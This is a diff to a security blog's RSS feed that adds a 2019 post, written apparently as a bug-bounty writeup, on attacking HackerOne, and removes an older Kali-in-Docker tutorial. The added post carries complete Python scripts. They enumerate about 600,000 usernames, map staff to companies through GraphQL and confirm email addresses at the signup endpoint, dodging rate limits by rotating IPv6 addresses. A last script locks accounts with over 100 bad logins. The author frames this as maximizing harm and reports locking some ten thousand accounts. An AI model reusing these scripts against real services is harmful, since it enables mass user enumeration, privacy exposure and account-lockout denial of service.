@@ -7,6 +7,281 @@
 <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
 
 <item>
+<title>Enum H1 Staff and Users email addresses and Lock accounts</title>
+<description>&lt;h1 id=&quot;enum-h1-staff-and-users-email-addresses-and-lock-accounts&quot;&gt;Enum H1 Staff and Users email addresses and Lock accounts&lt;/h1&gt;
+&lt;p class=&quot;date&quot;&gt;14 Dec 2019 - Tr3jer_CongRong&lt;/p&gt;
+
+&lt;p&gt;I found https://hackerone.com/sitemap.json a few months ago, but saw that only users starting withawere returned, but later I found out that it can be accessed via the parameter &lt;code&gt;first&lt;/code&gt; Enumerate all users:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;https://hackerone.com/sitemap.json?first=[a-z]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;After I got the id of nearly 600,000 users, thinking about how to use this data to maximize the harm?&lt;/p&gt;
+
+&lt;p&gt;So I thought of three ideas:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;By requesting the &lt;code&gt;graphql&lt;/code&gt; interface, query the team that each user belongs to. Reverse this result into: List of companies-&amp;gt; Staff. (Unrestricted)&lt;/li&gt;
+  &lt;li&gt;Merge all common email addresses with ids, and enumerate whether the email addresses exists in the registration interface. (Limited, but can be bypassed with more IPv6)&lt;/li&gt;
+  &lt;li&gt;Finally, you can use the blasted email addresses to log-in to the interface and request more than 100+ wrong passwords to lock your account. XD&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&quot;0x01-company---staff&quot;&gt;0x01 Company -&amp;gt; Staff:&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python
+#coding:utf-8
+
+import os
+import time
+import json
+import string
+import requests
+
+def main(name):
+    print name
+    datas = {&quot;operationName&quot;:&quot;getTeams&quot;,&quot;variables&quot;:{&quot;username&quot;:&quot;{}&quot;.format(name)},&quot;query&quot;:&quot;query getTeams($username: String!) {\n  user(username: $username) {\n    memberships(first: 10, where: {concealed: {_eq: false}}) {\n      total_count\n      edges {\n        node {\n          id\n          team {\n            id\n            name\n            handle\n            state\n            profile_picture(size: small)\n            __typename\n          }\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n&quot;}
+
+    headers={
+        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0&quot;,
+        &quot;content-type&quot;: &quot;application/json&quot;,
+        &quot;x-auth-token&quot;: &quot;----&quot;,
+        &quot;Connection&quot;: &quot;close&quot;
+    }
+    try:
+        r = requests.post(&quot;https://hackerone.com/graphql&quot;,headers=headers , data=json.dumps(datas), timeout=5)
+        ret = json.loads(r.content)['data']['user']['memberships']
+        if isinstance(ret['total_count'],int):
+            f = open(&quot;done.txt&quot;,'a')
+            f.write(name + '\n')
+            f.close()
+
+            if ret['total_count'] != 0:
+                results = {name:[team['node']['team']['handle'] for team in ret['edges']]}
+                print results
+                with open(&quot;results/{}.txt&quot;.format(name),'w') as fp:
+                    json.dump(results, fp, indent=4, ensure_ascii=False)
+    except Exception,e:
+        print e
+
+if __name__ == '__main__':
+    done = [i.strip() for i in open(&quot;done.txt&quot;)]
+    for i in string.lowercase:
+        with open(&quot;{}.txt&quot;.format(i)) as f:
+            jf = json.load(f)
+            for k in jf['users']:
+                if k['username'] not in done:
+                    ret = main(k['username'])
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://blog-1252048719.cos.ap-shanghai.myqcloud.com/aa2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After reversing, the staff corresponding to the company is generated:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;#coding:utf-8
+
+import os
+import json
+import string
+
+def main():
+	companys = {}
+	staffs = os.listdir('results')
+	for sf in filter(lambda x:x[-4:] == '.txt',staffs):
+		staff = sf[:-4]
+		with open('results/{}'.format(sf)) as f:
+			sTmp = json.load(f)
+			for c in sTmp.values()[0]:
+				if c not in companys.keys():
+					companys[c] = []
+				companys[c].append(staff)
+
+	profiles = {}
+
+	for i in string.lowercase:
+		with open(&quot;{}.txt&quot;.format(i)) as f:
+			jf = json.load(f)
+			for k in jf['profiles']:
+				profiles[k['handle']] = k['name']
+
+	f = open(&quot;staffList.txt&quot;,'a')
+	f.write(&quot;| Company (347) | Staff (3488) |\n| --- | --- |\n&quot;)
+	for k,v in companys.items():
+		inc = profiles[k] if k in profiles.keys() else k
+		users = []
+		for u in v:
+			users.append(&quot;[{}](https://hackerone.com/{})&quot;.format(u,u))
+		f.write('| [{}](https://hackerone.com/{}) | '.format(inc,k) + '、'.join(users) + ' |\n')
+	f.close()
+
+
+if __name__ == '__main__':
+	main()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So I have a list of &lt;code&gt;347&lt;/code&gt; teams corresponding to &lt;code&gt;3488&lt;/code&gt; staff XD&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/Symbo1/HackerOne-Staffs&quot; target=&quot;_blank&quot;&gt;https://github.com/Symbo1/HackerOne-Staffs&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://blog-1252048719.cos.ap-shanghai.myqcloud.com/aa3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;0x02-enumeration-email-addresses&quot;&gt;0x02 Enumeration email addresses:&lt;/h2&gt;
+
+&lt;p&gt;Under normal circumstances, the registered API will be frequency-limited, but can be bypassed by adding a large number of IPv6 enumerations:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://blog-1252048719.cos.ap-shanghai.myqcloud.com/aa4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Here only use gmail for testing, in fact, you can also add outlook, yahoo, mail.ru …&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;import json
+import random
+import string
+import requests
+import netifaces
+from gevent import monkey
+from gevent.pool import Pool
+from requests_toolbelt.adapters import source
+
+monkey.patch_all()
+interfaces = 'ens3'
+
+ips = []
+for ipv6 in netifaces.ifaddresses(interfaces)[netifaces.AF_INET6]:
+	if not ipv6['addr'].split(':')[0] == &quot;fe80&quot;:
+		ips.append(ipv6['addr'].split('%')[0])
+
+def main(username):
+	print username
+	email = &quot;{}@gmail.com&quot;.format(username)
+	datas = {
+		&quot;user[email]&quot;: email
+	}
+
+	headers={
+		&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0&quot;,
+		&quot;Accept&quot;:&quot;application/json, text/javascript, */*; q=0.01&quot;,
+		&quot;X-CSRF-Token&quot;:&quot;...&quot;,
+		&quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;,
+		&quot;X-Requested-With&quot;:&quot;XMLHttpRequest&quot;,
+		&quot;Cookie&quot;: &quot;...&quot;,
+		&quot;Connection&quot;:&quot;keep-alive&quot;
+	}
+	try:
+
+		s = requests.Session()
+		new_source = source.SourceAddressAdapter(random.choice(ips))
+		s.mount('http://', new_source)
+		s.mount('https://', new_source)
+
+		r = s.post(&quot;https://hackerone.com/users&quot;,headers=headers , data=datas, timeout=5)
+		ret = json.loads(r.content)[&quot;errors&quot;]
+		if ret:
+			f = open(&quot;email-done.txt&quot;,'a')
+			f.write(username + '\n')
+			f.close()
+			if &quot;email&quot; in ret.keys():
+				print email
+				f = open(&quot;emails.txt&quot;,'a')
+				f.write(email + '\n')
+				f.close()
+	except Exception,e:
+		print e
+
+if __name__ == '__main__':
+	tasks = []
+	done = [i.strip() for i in open(&quot;email-done.txt&quot;)]
+	for i in string.lowercase[:1]:
+		with open(&quot;{}.txt&quot;.format(i)) as f:
+			jf = json.load(f)
+			for k in jf['users']:
+				if k['username'] not in done:
+					tasks.append(k['username'])
+	pool = Pool(20)
+	pool.map(main, tasks)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://blog-1252048719.cos.ap-shanghai.myqcloud.com/aa5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After enumerating &lt;code&gt;30k+&lt;/code&gt; ID’s I stopped the testing, and &lt;code&gt;2887&lt;/code&gt; of them returned with success: (ps. emmmm悄悄的说，后来我获取到了几万)&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://blog-1252048719.cos.ap-shanghai.myqcloud.com/aa0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As such, for total &lt;code&gt;600k&lt;/code&gt; ID’s, we may be able to get at least tens thousands of valid email addresses.&lt;/p&gt;
+
+&lt;h2 id=&quot;0x03-lock-accounts&quot;&gt;0x03 Lock accounts:&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code&gt;import sys
+import random
+import string
+import requests
+import netifaces
+from gevent import monkey
+from gevent.pool import Pool
+from requests_toolbelt.adapters import source
+
+monkey.patch_all()
+interfaces = 'ens3'
+
+ips = []
+for ipv6 in netifaces.ifaddresses(interfaces)[netifaces.AF_INET6]:
+	if not ipv6['addr'].split(':')[0] == &quot;fe80&quot;:
+		ips.append(ipv6['addr'].split('%')[0])
+
+def main(email):
+	datas = {
+		&quot;email&quot;:email,
+		&quot;password&quot;:''.join(random.sample(string.lowercase,10)),
+		&quot;remember_me&quot;:&quot;false&quot;
+	}
+
+	headers={
+		&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0&quot;,
+		&quot;Accept&quot;:&quot;application/json, text/javascript, */*; q=0.01&quot;,
+		&quot;X-CSRF-Token&quot;:&quot;...&quot;,
+		&quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;,
+		&quot;X-Requested-With&quot;:&quot;XMLHttpRequest&quot;,
+		&quot;Cookie&quot;: &quot;...&quot;,
+		&quot;Connection&quot;:&quot;keep-alive&quot;
+	}
+	try:
+
+		s = requests.Session()
+		new_source = source.SourceAddressAdapter(random.choice(ips))
+		s.mount('http://', new_source)
+		s.mount('https://', new_source)
+
+		r = s.post(&quot;https://hackerone.com/sessions&quot;,headers=headers , data=datas, timeout=5)
+		print &quot;password: {} {}&quot;.format(datas['password'],r.content)
+	except Exception,e:
+		print e
+
+if __name__ == '__main__':
+	tasks = [sys.argv[1]]*110
+	pool = Pool(20)
+	pool.map(main, tasks)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://blog-1252048719.cos.ap-shanghai.myqcloud.com/aa7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After 100+ login attempts with incorrect passwords, the account was locked out successfully.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://blog-1252048719.cos.ap-shanghai.myqcloud.com/aa6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;If I want to lock someone’s account, I just need to enumerate the email addresses and then loop the script. Because the session will be invalidated after being locked, and the &lt;code&gt;unlock token&lt;/code&gt; is unique each time it is locked.&lt;/p&gt;
+
+&lt;h2 id=&quot;0x04-end&quot;&gt;0x04 End.&lt;/h2&gt;
+
+&lt;p&gt;后来的故事就是封了万个号，h1官方进行了修正，并向被锁账号们群发了该事件的邮件：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://blog-1252048719.cos.ap-shanghai.myqcloud.com/aa10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Just For Fun :]&lt;/p&gt;
+</description>
+<pubDate>Sat, 14 Dec 2019 00:00:00 +0800</pubDate>
+<link>http://localhost:4000/2019/12/14/enum-h1-staff-users-email-addresses-lock-accounts.html</link>
+<guid isPermaLink="true">http://localhost:4000/2019/12/14/enum-h1-staff-users-email-addresses-lock-accounts.html</guid>
+</item>
+
+<item>
 <title>技术人如何保养身体</title>
 <description>&lt;h1 id=&quot;技术人如何保养身体&quot;&gt;技术人如何保养身体&lt;/h1&gt;
 &lt;p class=&quot;date&quot;&gt;22 Mar 2019 - Tr3jer_CongRong&lt;/p&gt;
@@ -1802,138 +2077,6 @@ if(!empty($file) &amp;amp;&amp;amp; is_file($file) &amp;amp;&amp;amp; in_array($
 <pubDate>Sun, 27 Dec 2015 00:00:00 +0800</pubDate>
 <link>http://localhost:4000/2015/12/27/rips-scanners-vul.html</link>
 <guid isPermaLink="true">http://localhost:4000/2015/12/27/rips-scanners-vul.html</guid>
-</item>
-
-<item>
-<title>Under The Docker Run Kali Linux</title>
-<description>&lt;h1 id=&quot;under-the-docker-run-kali-linux&quot;&gt;Under The Docker Run Kali Linux&lt;/h1&gt;
-&lt;p class=&quot;date&quot;&gt;13 Nov 2015 - Tr3jer_CongRong&lt;/p&gt;
-
-&lt;h4 id=&quot;简介&quot;&gt;简介&lt;/h4&gt;
-&lt;ul&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;code&gt;Docker&lt;/code&gt;是一个由GO语言写的程序运行的开源的应用&lt;code&gt;容器&lt;/code&gt;引擎（Linux containers， LXCs），让开发者可以打包他们的应用以及依赖包到一个可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口（类似 iPhone 的 app）。几乎没有性能开销,可以很容易地在机器和数据中心中运行。最重要的是,他们不依赖于任何语言、框架包括系统。&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;code&gt;Kali Linux&lt;/code&gt;是基于Debian的Linux发行版， 设计用于数字取证和渗透测试 和 黑客攻防。
-Kali Linux预装了许多渗透测试软件，包括nmap (端口扫描器)、Wireshark (数据包分析器)、John the Ripper (密码破解器),以及Aircrack-ng (一套用于对无线局域网进行渗透测试的软件). 用户可通过硬盘、live CD或live USB运行Kali Linux。Metasploit的Metasploit Framework支持Kali Linux，Metasploit一套针对远程主机进行开发和执行Exploit代码的工具。&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h4 id=&quot;好处&quot;&gt;好处&lt;/h4&gt;
-&lt;p&gt;      Docker相比KVM之类最明显的特点就是启动快，资源占用小。因此对于构建隔离的标准化的运行环境，轻量级的PaaS， 构建自动化测试和持续集成环境，以及一切可以横向扩展的应用都可轻松应对。具体说来，&lt;code&gt;Docker在如下几个方面具有较大的优势&lt;/code&gt;：&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;更快速的交付和部署&lt;/li&gt;
-  &lt;li&gt;更高效的虚拟化&lt;/li&gt;
-  &lt;li&gt;更轻松的迁移和扩展&lt;/li&gt;
-  &lt;li&gt;更简单的管理&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;      kali原镜像所含的渗透套件很丰富，基本渗透中的需求都可以满足，但是长期使用会显得有些臃肿，比如换个环境(迁移)，扔锅(被取证)等等，既然想&lt;code&gt;方便&lt;/code&gt;/&lt;code&gt;快捷&lt;/code&gt;/&lt;code&gt;高效&lt;/code&gt;的使用Kali，Docker虚拟化再合适不过。&lt;/p&gt;
-
-&lt;h4 id=&quot;安装docker&quot;&gt;安装Docker&lt;/h4&gt;
-&lt;p&gt;      我是在&lt;code&gt;Mac&lt;/code&gt;下安装的Docker，Docker引擎使用了Linux内核特定的特性，所以要让它运行在OS X上我们需要用一个轻量型的虚拟机，如(Virtualbox, Vmware Fusion, Parallel Desktop)等。用OS X的Docker客户端来控制虚拟Docker来构建，运行以及管理Docker容器。&lt;/p&gt;
-
-&lt;p&gt;      Boot2Docker是帮助控制虚拟机中 Docker 的工具，它会下载一个安装好docker的虚拟机，并控制其实现docker功能：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;brew install boot2docker
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;安装Docker client：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;# Get the docker client file
-DIR=$(mktemp -d ${TMPDIR:-/tmp}/dockerdl.XXXXXXX) &amp;amp;&amp;amp; \
-curl -f -o $DIR/ld.tgz https://get.docker.io/builds/Darwin/x86_64/docker-latest.tgz &amp;amp;&amp;amp; \
-gunzip $DIR/ld.tgz &amp;amp;&amp;amp; \
-tar xvf $DIR/ld.tar -C $DIR/ &amp;amp;&amp;amp; \
-cp $DIR/usr/local/bin/docker ./docker
-
-# Set the environment variable for the docker daemon
-export DOCKER_HOST=tcp://127.0.0.1:4243
-
-# Copy the executable file
-sudo cp docker /usr/local/bin/
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;      或者直接使用&lt;a href=&quot;https://github.com/boot2docker/osx-installer/releases&quot;&gt;Boot2Docker.pkg&lt;/a&gt;安装，安装好后运行boot2docker这个client command，这个过程会进行初始化下载一个boot2docer.iso，然后会用ssh生成用于docker的ssh的公钥和私钥对，用于远程.&lt;/p&gt;
-
-&lt;p&gt;初始化后运行boot2docker报了个错，对应设置到环境变量即可。&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;➜ ~ boot2docker start
-Waiting for VM and Docker daemon to start...
-.o
-Started.
-Writing /Users/CongRong/.boot2docker/certs/boot2docker-vm/ca.pem
-Writing /Users/CongRong/.boot2docker/certs/boot2docker-vm/cert.pem
-Writing /Users/CongRong/.boot2docker/certs/boot2docker-vm/key.pem
-Your environment variables are already set correctly.
-
-To connect the Docker client to the Docker daemon, please set:
-export DOCKER_CERT_PATH=/Users/CongRong/.boot2docker/certs/boot2docker-vm
-export DOCKER_TLS_VERIFY=1
-export DOCKER_HOST=tcp://192.168.59.103:2376
-
-Or run: `eval &quot;$(boot2docker shellinit)&quot;`
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h4 id=&quot;安装镜像&quot;&gt;安装镜像&lt;/h4&gt;
-&lt;p&gt;      kali-linux-docker的&lt;a href=&quot;https://hub.docker.com/r/kalilinux/kali-linux-docker/&quot;&gt;DockerHub主页&lt;/a&gt;，或者直接搜索：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;➜ ~ docker search kali
-NAME                                      DESCRIPTION                                     STARS     OFFICIAL   AUTOMATED
-kalilinux/kali-linux-docker               Kali Linux 2.x Base Image                       120                  [OK]
-linuxkonsult/kali-metasploit              Kali base image with metasploit                 26                   [OK]
-linuxkonsult/kali                         Kali Linux 2.0 base image                       8
-brimstone/kali                                                                            3                    [OK]
-kkirsche/kali-linux-docker                Unofficial Kali Linux Docker                    2                    [OK]
-kalilinux/kali-linux-docker-rolling       Kali Linux Rolling Docker Image                 2                    [OK]
-wsec/kali-metasploit                      Official Kali Base image + Metasploit           2                    [OK]
-officialkali/kali                                                                         2
-kalilinux/kali                                                                            2
-lodelestra/kali-linux-metasploit-docker   metasploit docker based on kali-linux-docker    1                    [OK]
-ctarwater/kali-msf                        Kali + Metasploit + Postgresql                  1                    [OK]
-e3rp4y/kali-metasploit                                                                    1                    [OK]
-blackfinsecurity/tha-kali                                                                 1                    [OK]
-andresriancho/w3af-kali                                                                   0                    [OK]
-ctarwater/kali                            Kali base image (no tools)                      0                    [OK]
-netxp/kali                                kali                                            0                    [OK]
-johnsandiford/kali                                                                        0                    [OK]
-miteshshah/kali                           Kali Linux                                      0                    [OK]
-nicot/kali                                                                                0                    [OK]
-lxj616/docker-kali-custom-tools           docker-kali-custom-tools                        0                    [OK]
-jasonchaffee/kali-linux                   Kali Linux Docker Container                     0                    [OK]
-ctarwater/kali-msf-micro                  Kali + Metasploit with all of the Metasplo...   0                    [OK]
-scottj/kali-docker                        Custom Kali 2.0 Docker Build                    0                    [OK]
-digitalshokunin/kali-metasploit                                                           0                    [OK]
-butlerrc30/kali-ssh                       Kali image that generates random cert for ...   0                    [OK]
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;安装Kali：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;docker pull kalilinux/kali-linux-docker
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;拉取安装后就可以启动了，因为是纯净的kali镜像所以只有420MB，需要什么直接apt-get。&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://blog-1252048719.cos.ap-shanghai.myqcloud.com/3r4tgdfxvc.png&quot; /&gt;&lt;/p&gt;
-
-&lt;h4 id=&quot;常见问题&quot;&gt;常见问题&lt;/h4&gt;
-&lt;ul&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;a href=&quot;http://stackoverflow.com/questions/29799491/after-upgrade-boot2docker-1-5-to-1-6-error-appendfailed-to-get-machine-boot2do/29819016&quot;&gt;After upgrade Boot2Docker 1.5 to 1.6 error append:Failed to get machine “boot2docker-vm”: machine does not exist (Did you run &lt;code&gt;boot2docker init&lt;/code&gt;?)&lt;/a&gt;&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;a href=&quot;http://stackoverflow.com/questions/26572112/how-to-fix-error-in-run-failed-to-get-machine-boot2docker-vm-machine-does-n&quot;&gt;How to fix “error in run: Failed to get machine ”boot2docker-vm“: machine does not exist”?&lt;/a&gt;&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;a href=&quot;http://stackoverflow.com/questions/29294286/fata0000-get-http-var-run-docker-sock-v1-17-version-dial-unix-var-run-doc&quot;&gt;FATA[0000] Post http:///var/run/docker.sock/v1.18/images/create?fromImage=kalilinux%2Fkali-linux-docker%3Alatest: dial unix /var/run/docker.sock: no such file or directory. Are you trying to connect to a TLS-enabled daemon without TLS?&lt;/a&gt;&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-</description>
-<pubDate>Fri, 13 Nov 2015 00:00:00 +0800</pubDate>
-<link>http://localhost:4000/2015/11/13/kali-use-docker.html</link>
-<guid isPermaLink="true">http://localhost:4000/2015/11/13/kali-use-docker.html</guid>
 </item>
 
 </channel>
